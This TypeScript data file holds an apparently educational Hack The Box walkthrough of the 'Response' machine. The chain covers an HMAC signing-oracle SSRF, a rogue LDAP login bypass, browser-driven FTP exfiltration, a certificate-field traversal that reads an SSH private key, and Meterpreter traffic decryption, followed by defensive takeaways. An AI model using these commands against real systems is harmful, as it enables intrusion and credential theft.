import type { WalkthroughDoc } from "./types";

export const response: WalkthroughDoc = {
  slug: "response",
  name: "Response",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Insane",
  retired: "Feb 2023",
  ip: "10.10.11.x",
  tags: [
    "HMAC signing oracle",
    "SSRF proxy",
    "rogue LDAP bypass",
    "cross-protocol FTP forgery",
    "NSE directory traversal",
    "Meterpreter decrypt",
    "SSH key recovery",
  ],
  lede: "One of the longest chains on the platform: an HMAC signing oracle turns a locked-down fetch feature into a full internal-network proxy, a rogue LDAP server hands us admin on a socket.io chat, a browser is coerced into talking FTP, a backdoored nmap NSE script leaks an SSH key, and a captured Meterpreter session gives up root — if you can rebuild a broken private key from a core dump.",
  summary: "Weaponise an HMAC signing oracle into an SSRF proxy, bypass LDAP auth with a rogue server, forge cross-protocol FTP requests, exploit a backdoored ssl-cert NSE script, then decrypt Meterpreter traffic to rebuild root's SSH key.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“The server will fetch any URL you like — as long as it signed it first.”" },
        { kind: "p", text: "**Response** is an Insane-rated Linux machine modelled on an internet-facing company that sells an automated website-scanning service. Almost nothing interesting is directly exposed: the whole intended path is web-driven, because every real service — a chat application, an LDAP directory, an FTP server, the scanner itself — lives on an internal network reachable only *through* the public app. This is a proxy-into-the-network box, and the rating comes from the length of the chain, not from any single exploit." },
        { kind: "p", text: "Each stage manufactures the primitive the next stage needs. Before we start, here is the complete route from an unauthenticated scan to a root shell:" },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap; Apache on `:80`, vhost `www.response.htb`",
            "**fetch endpoint** — `url` + `url_digest` HMAC blocks naive SSRF",
            "**signing oracle** — session endpoint signs attacker input → forge any `url_digest`",
            "**SSRF proxy** — sign-then-fetch wrapper → full internal-network HTTP proxy",
            "**socket.io chat** — read source; auth is LDAP, and the LDAP host is influenceable",
            "**rogue LDAP** — bind-accept server → log in as `admin`, talk to `bob`",
            "**bob** — discloses internal FTP creds (not directly routable)",
            "**XPRF** — malicious JS to bob’s browser → active-mode FTP exfil",
            "**ssl-cert NSE** — cert `ST` field traversal → read `/home/scryh/.ssh/id_rsa`",
            "**ssh scryh** — `user.txt`; find `incident_*` (pcap + core dump)",
            "**decrypt Meterpreter** — per-packet 4-byte XOR key over `dump.pcap`",
            "**rebuild SSH key** — reconstruct corrupted key from the core dump → `ssh root` → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "A box about trust boundaries", text: "Every stage abuses a trust that was granted to the wrong party: the app trusts a signature it will produce for you, the chat trusts whatever LDAP server it is told to use, the FTP server trusts a browser, the scanner trusts a certificate field, and an incident responder trusted that captured C2 traffic was opaque. Read each service’s assumptions and you will find the crack." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A full TCP sweep, then a service scan of what answers. Externally the machine is deliberately quiet — the web app on port 80 is the only meaningful entry point, and everything else we will attack sits behind it." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 -oA response 10.10.11.x",
            "$ nmap -sCV -p 80 10.10.11.x",
            "PORT   STATE SERVICE VERSION",
            "80/tcp open  http    Apache httpd",
            "|_http-title: Did not follow redirect to http://www.response.htb/",
          ],
        },
        { kind: "callout", variant: "note", title: "HTTP-primary by design", text: "Port 80 redirects to the `www.response.htb` virtual host, so we add it to our hosts file. Any other listener (an SSH daemon may be up) is not the intended way in — the entire foothold is delivered through the web application, which is the point of the machine." },
        {
          kind: "code",
          lang: "bash",
          lines: ["$ echo '10.10.11.x response.htb www.response.htb' | sudo tee -a /etc/hosts"],
        },
        { kind: "p", text: "With only one meaningful port, the attack surface is entirely the web application. We browse to the virtual host and start reading what it actually does." },
      ],
    },
    {
      id: "fetch",
      num: "02",
      title: "The signed fetch endpoint",
      blocks: [
        { kind: "h3", text: "The scanning service" },
        { kind: "p", text: "`www.response.htb` advertises an *automated website scanner*: you hand it a URL, the server fetches it, and it reports back. That is a textbook server-side request forgery surface — the whole product is a fetch-arbitrary-URL feature. The catch is that the request carries two parameters, `url` and `url_digest`, and tampering with `url` on its own is rejected." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s 'http://www.response.htb/status/fetch?url=http://10.10.14.x/&url_digest=<digest>'",
            "# now change the url but keep the digest:",
            "$ curl -s 'http://www.response.htb/status/fetch?url=http://10.10.11.x:8080/&url_digest=<digest>'",
            "invalid url_digest",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Fetch endpoint parameters `url` + `url_digest`, where `url_digest` is an **HMAC over the `url` value**. It is an anti-tamper control: change the URL and the digest no longer matches, so the naive SSRF is dead on arrival. We need a way to produce a valid digest for a URL of our choosing." },
      ],
    },
    {
      id: "oracle",
      num: "03",
      title: "The HMAC signing oracle",
      blocks: [
        { kind: "p", text: "We do not know the HMAC secret and there is no realistic way to brute-force it. But the application hands us a second piece of functionality that changes everything: a *session*-style endpoint that takes a value we submit (via a cookie) and returns the **digest of that value**. That is a signing oracle. We never learn the key, yet the server will happily sign anything we ask it to." },
        { kind: "p", text: "The bypass is then a two-step: submit the target URL to the oracle, collect the digest it hands back, and replay that URL plus the harvested digest to the fetch endpoint. The anti-tamper check passes because — as far as the server is concerned — it produced the signature itself." },
        {
          kind: "code",
          lang: "bash",
          label: "bash — sign, then fetch",
          lines: [
            "# 1) ask the oracle to sign our target URL",
            "$ curl -s 'http://www.response.htb/' -H 'Cookie: session=http://10.10.14.x/leak'",
            "# -> returns a valid digest for that exact value",
            "",
            "# 2) replay to the fetch endpoint with the harvested digest",
            "$ curl -s 'http://www.response.htb/status/fetch?url=http://10.10.14.x/leak&url_digest=<oracle digest>'",
          ],
        },
        { kind: "p", text: "We confirm the primitive by pointing it back at ourselves and watching the request land on our listener — the server fetches the URL we signed, proving we control the target end-to-end." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ python3 -m http.server 80",
            "10.10.11.x - - \"GET /leak HTTP/1.1\" 200 -",
          ],
          highlight: [1],
        },
        { kind: "callout", variant: "warn", title: "Sign every request, not just the first", text: "The digest is bound to one specific URL. To reach *many* internal paths we have to re-sign each one, so the workable shape is a small local HTTP proxy that, for every request it receives, first calls the oracle to sign that URL and only then dispatches it through the fetch endpoint. Skip the signing step for any single URL and it fails the digest check." },
        { kind: "callout", variant: "key", title: "Primitive", text: "A full server-side request forgery into the internal network. With the oracle wrapped in a sign-then-fetch proxy, `curl` and even a browser can be pointed straight at internal hosts through `http://www.response.htb`." },
      ],
    },
    {
      id: "chat",
      num: "04",
      title: "Reaching the internal chat app",
      blocks: [
        { kind: "p", text: "Proxying through the SSRF and sweeping the internal ranges turns up a chat application built on the **socket.io** library. Through the proxy we can both talk to it and pull its client bundle, so we do both — first grab the transport shim, then read the source to understand how it authenticates." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# point a client at the internal chat host through our sign-then-fetch proxy",
            "$ curl --proxy http://127.0.0.1:<localproxy> \\",
            "       http://<chat-internal-host>/socket.io/socket.io.js",
            "# then retrieve the app bundle / source to review the auth logic",
          ],
        },
        { kind: "p", text: "Initial access is as a low-privilege **guest**, which is a dead end on its own. Two facts jump out of the source. First, authentication is delegated to an **LDAP** server. Second — and this is the crack — the LDAP endpoint the app binds against is not hard-locked; it can be influenced into pointing wherever we like. In-app, an employee named **bob** is visibly eager to talk to the **admin** user, which is the tell that becoming admin is what unlocks the next set of secrets." },
        { kind: "callout", variant: "warn", title: "Mind the transport", text: "socket.io upgrades to a websocket or long-poll transport and performs its own handshake. Our SSRF proxy has to carry that handshake, not just plain `GET`s, or the client never finishes connecting. Getting the proxy to speak socket.io cleanly is most of the work in this stage." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Internal **socket.io** chat app; role **guest**; auth backend is **LDAP** with an attacker-influenceable server address; key NPC **bob**, who only shares his secret with **admin**." },
      ],
    },
    {
      id: "ldap",
      num: "05",
      title: "Rogue LDAP → admin",
      blocks: [
        { kind: "epigraph", text: "“Any password is correct if you own the server that checks it.”" },
        { kind: "p", text: "Because the chat validates credentials against an LDAP server whose address it can be made to use, we do not need to crack anything. We stand up our own LDAP server configured to answer every bind as a success, then steer the app’s authentication at it. Any login — including the `admin` account — is accepted. This is an authentication *bypass*, not a credential recovery." },
        {
          kind: "code",
          lang: "bash",
          label: "bash — attacker host",
          lines: [
            "# run a permissive LDAP server that bind-accepts and returns the",
            "# objectClasses / attributes the chat app expects",
            "$ sudo slapd -d 0 -h 'ldap://0.0.0.0:389'",
            "# steer the chat app's auth at our host via the source-exposed mechanism,",
            "# then log in as 'admin' with any password -> bind succeeds",
          ],
        },
        { kind: "p", text: "Logged in as **admin**, we can now open a direct conversation with bob — exactly the audience he has been waiting for." },
        { kind: "callout", variant: "warn", title: "It is a bypass — don’t crack", text: "Do not waste time trying to recover an LDAP password; there isn’t one to find. The only subtlety is that the rogue server must return whatever attributes and `objectClass` values the app expects, or the login flow errors out before it ever reaches the accept path." },
        { kind: "callout", variant: "key", title: "Recovered", text: "**admin** on the chat app via rogue-LDAP bind bypass (no password). That unlocks bob." },
      ],
    },
    {
      id: "bob",
      num: "06",
      title: "FTP credentials from bob",
      blocks: [
        { kind: "p", text: "As admin we prompt bob, and he shares sensitive internal information — including credentials for an internal **FTP** server. The catch, which will shape the entire next stage, is that the FTP host is not routable from our position. We cannot simply `ftp` to it; the credentials alone are not directly actionable and have to be spent through another in-network vector." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# as admin in chat, bob discloses the internal FTP server + credentials",
            "# direct access fails — the host is not reachable from outside:",
            "$ ftp <internal-ftp-host>",
            "ftp: connect: No route to host",
          ],
        },
        { kind: "callout", variant: "warn", title: "The creds are fuel, not a login", text: "The point of bob’s credentials is to feed the cross-protocol forgery in the next stage, where they will be smuggled to the FTP server from *inside* the network. Trying to use them from your own box is a dead end by design." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Internal **FTP** server credentials, disclosed by bob to the admin account. Usable only from a host that can actually reach the FTP service — i.e. bob’s own browser." },
      ],
    },
    {
      id: "xprf",
      num: "07",
      title: "Cross-protocol request forgery → FTP exfil",
      blocks: [
        { kind: "p", text: "bob has a browser sitting inside the network, and as admin we can put a link in front of him. So we host a malicious JavaScript payload and send bob the link. When his browser loads it, the JS performs a **cross-protocol request forgery**: an HTTP request is smuggled to the FTP server’s port so that the FTP daemon parses attacker-controlled commands, executed from bob’s trusted network position using the credentials he disclosed." },
        { kind: "p", text: "The exfiltration works because the FTP server runs in **active mode** by default. In active mode the *server* opens the data connection back out — and we point it at ourselves with a `PORT` command — so the file contents come straight to our listener." },
        {
          kind: "code",
          lang: "bash",
          label: "bash — attacker host",
          lines: [
            "# host the malicious JS",
            "$ python3 -m http.server 80",
            "",
            "# the JS smuggles USER/PASS/PORT/RETR to ftp://<creds>@<internal-ftp>:21",
            "# with an active-mode PORT pointing back at us; deliver the link to bob in chat",
            "",
            "# catch the active-mode data connection carrying the exfiltrated files",
            "$ nc -lvnp <active-mode-data-port>",
          ],
        },
        { kind: "callout", variant: "warn", title: "Active mode is the whole trick", text: "Active mode is why the data channel dials back to us — passive mode would break the exfil entirely, since the browser can’t read the server’s passive response cross-origin. The payload only needs to speak enough FTP (`USER`/`PASS`/`PORT`/`RETR`) to be smuggled over the cross-protocol request." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Files pulled from the internal FTP server via bob’s browser — the material needed to feed the scanning service and push toward user." },
      ],
    },
    {
      id: "nse",
      num: "08",
      title: "Backdoored ssl-cert NSE → arbitrary file read",
      blocks: [
        { kind: "epigraph", text: "“The scanner reads your certificate. Make sure it reads more than you meant.”" },
        { kind: "p", text: "The scanning service scans customer-supplied hosts. We register our own host as a computer — an LDAP entry — so that the scanner picks it up and targets us. Under the hood the scanner runs **nmap** with a *slightly modified* `ssl-cert` NSE script, and the modification introduces a directory traversal: the certificate’s **stateOrProvinceName** (`ST`) field is used unsanitised when the script handles output, so a `../../..` payload in that field lets us control the path and read an arbitrary file off the box." },
        { kind: "p", text: "So we generate a TLS certificate whose `ST` field carries a traversal payload, serve HTTPS with it, and get ourselves scanned. When the backdoored `ssl-cert` script parses our certificate, the traversal fires and the target file comes back in the scan result. We aim it at scryh’s private key." },
        {
          kind: "code",
          lang: "bash",
          label: "bash — attacker host",
          lines: [
            "# bake the traversal into the cert's State/Province (ST) field",
            "$ openssl req -new -x509 -newkey rsa:2048 -nodes -keyout evil.key -out evil.crt \\",
            "    -subj '/C=US/ST=../../../../home/scryh/.ssh/id_rsa/L=x/O=x/CN=x'",
            "",
            "# serve HTTPS with that certificate on the port the scanner will hit",
            "$ openssl s_server -cert evil.crt -key evil.key -accept 443 -www",
            "",
            "# add the LDAP/computer entry for our host so the scanner scans us,",
            "# then read the leaked file out of the scan result -> scryh's id_rsa",
          ],
        },
        { kind: "callout", variant: "warn", title: "The payload lives in the certificate", text: "Because the vulnerable code path reads a certificate *field*, the traversal has to be baked into the certificate subject — not a URL, header, or filename. And it only fires if the scanner actually scans you, which is exactly why we first register the host as an LDAP computer entry. Only files readable by the scanning process come back, but in this design that includes scryh’s key." },
        { kind: "callout", variant: "key", title: "Recovered", text: "Arbitrary file read of **`/home/scryh/.ssh/id_rsa`** via the `ST`-field traversal in the backdoored `ssl-cert` NSE script. `scryh` is the foothold user (and the box creator’s handle)." },
      ],
    },
    {
      id: "user",
      num: "09",
      title: "Foothold & user.txt",
      blocks: [
        { kind: "p", text: "With scryh’s private key in hand we SSH straight in. This is the first time we touch a real shell on the box rather than proxying requests at it." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ chmod 600 scryh_id_rsa",
            "$ ssh -i scryh_id_rsa scryh@response.htb",
            "scryh@response:~$ cat /home/scryh/user.txt",
            "76a8fc64····························",
          ],
          highlight: [3],
        },
        { kind: "p", text: "That is user. But scryh’s home directory is where the box gets its name: an **incident-response** folder is sitting there, and it is the entire root path." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "scryh@response:~$ ls -la /home/scryh/incident_2022-3-042/",
            "IR_report.pdf",
            "dump.pcap",
            "core.<pid>          # core dump of a killed meterpreter process",
          ],
          highlight: [1, 2, 3],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`user.txt` (owned by scryh), plus an incident folder **`/home/scryh/incident_2022-3-042`** containing `IR_report.pdf`, `dump.pcap`, and a Meterpreter process **core dump** — the raw material for root." },
      ],
    },
    {
      id: "meterpreter",
      num: "10",
      title: "Decrypting the captured Meterpreter session",
      blocks: [
        { kind: "p", text: "We copy the artifacts back to our box and start with the report. `IR_report.pdf` tells the story: an attacker tricked the server admin into downloading and running a binary named **`auto_update`** — a Meterpreter payload — and the responder captured the aftermath. So `dump.pcap` should contain both the HTTP download of `auto_update` and the subsequent Meterpreter command-and-control traffic." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ scp -i scryh_id_rsa 'scryh@response.htb:/home/scryh/incident_*/*' .",
            "# find the auto_update download and the meterpreter C2 stream",
            "$ tshark -r dump.pcap -q -z follow,tcp,ascii,<stream>",
          ],
        },
        { kind: "p", text: "The C2 traffic looks like noise, but Meterpreter’s transport is not real encryption. Each packet is framed with a leading **4-byte XOR key** applied to the rest of that packet — and, critically, the key is **per-packet**, sitting in the first four bytes of each one. So decryption is just: read the 4-byte key off the front of every packet, XOR the remaining body with it, and reassemble." },
        {
          kind: "code",
          lang: "bash",
          label: "bash — decrypt the C2 stream",
          lines: [
            "# each meterpreter packet = 4-byte XOR key || XOR(key, body)",
            "$ python3 decrypt_meterpreter.py dump.pcap",
            "[+] XORing each packet with its own leading 4-byte key...",
            "[+] recovered meterpreter TLV commands + transferred files",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "warn", title: "Per-packet key, not a stream cipher", text: "Do not assume one static key for the whole session — the key changes with every packet and is prepended to it. Treat each Meterpreter frame independently: pull its 4 bytes, XOR its body, move on. Once decrypted, the session reveals what the attacker did on the box, including the key material the incident left behind." },
      ],
    },
    {
      id: "root",
      num: "11",
      title: "Rebuilding root’s SSH key → root.txt",
      blocks: [
        { kind: "epigraph", text: "“The key was in the memory of a process nobody bothered to sanitise.”" },
        { kind: "p", text: "Correlating the decrypted traffic with the process **core dump** is the final puzzle. The dump holds the memory of the killed Meterpreter process, and inside it is an SSH private key — but the copy that survives is **broken**: partially corrupted, missing components. The hard part is not carving bytes out of the core; it is *reconstructing* valid key material from what remains — recomputing the missing pieces so the key parses and validates." },
        {
          kind: "code",
          lang: "bash",
          label: "bash — analyse the core dump",
          lines: [
            "$ strings -a core.<pid> | grep -i 'PRIVATE KEY'",
            "$ gdb ./auto_update core.<pid>",
            "# carve the partial key out of memory, then rebuild the missing",
            "# components (recompute the CRT parameters) into a valid key",
          ],
        },
        { kind: "p", text: "With the reconstructed key repaired into a well-formed private key, it authenticates as **root** over SSH — the same key the attacker in the incident had been using. We log in and take the flag." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ chmod 600 root_id_rsa",
            "$ ssh -i root_id_rsa root@response.htb",
            "root@response:~# cat /root/root.txt",
            "286204e3····························",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Root’s SSH private key, rebuilt from the corrupted copy in the Meterpreter **core dump** cross-referenced with the decrypted `dump.pcap`. `ssh -i root_id_rsa root@response.htb` → `root.txt`." },
      ],
    },
    {
      id: "defense",
      num: "12",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Never expose a signing oracle.** An endpoint that returns the HMAC of user-supplied input lets an attacker forge signatures without ever knowing the secret, which completely nullified the `url_digest` anti-tamper control. Sign only server-derived values, and scope each signature tightly to its purpose.",
            "**A request signature is not an egress control.** SSRF defence needs allow-listed outbound targets and hard blocks on RFC1918/internal ranges — a valid signature should never be treated as permission to reach the internal network.",
            "**Pin your auth backend.** The chat app let its LDAP server address be influenced, so a rogue directory turned every bind into a success. Hard-lock the LDAP/AD endpoint and require mutual TLS so an attacker-controlled server cannot be substituted for an authentication bypass.",
            "**Harden FTP and browsers against cross-protocol forgery.** Disable active mode / restrict `PORT` commands, segment internal browsers, and apply origin checks so an HTTP request cannot be smuggled into an FTP control channel.",
            "**Never modify security tooling in ways that trust attacker input.** The backdoored `ssl-cert` NSE script used an unsanitised `stateOrProvinceName` in a file path — a classic directory traversal. Sanitise every externally supplied certificate field before it touches the filesystem.",
            "**Treat incident artifacts as live secrets.** PCAPs and core dumps of C2 sessions contain recoverable keys; Meterpreter’s per-packet XOR transport is trivially reversible. Store them encrypted, rotate any key that could have been captured, and keep them off multi-user hosts.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "HMAC signing-oracle abuse · SSRF-to-proxy weaponisation · socket.io enumeration · rogue-LDAP authentication bypass · cross-protocol request forgery · active-mode FTP exfiltration · NSE directory traversal via certificate fields · Meterpreter traffic decryption · core-dump analysis · corrupted SSH-key reconstruction." },
      ],
    },
  ],
};
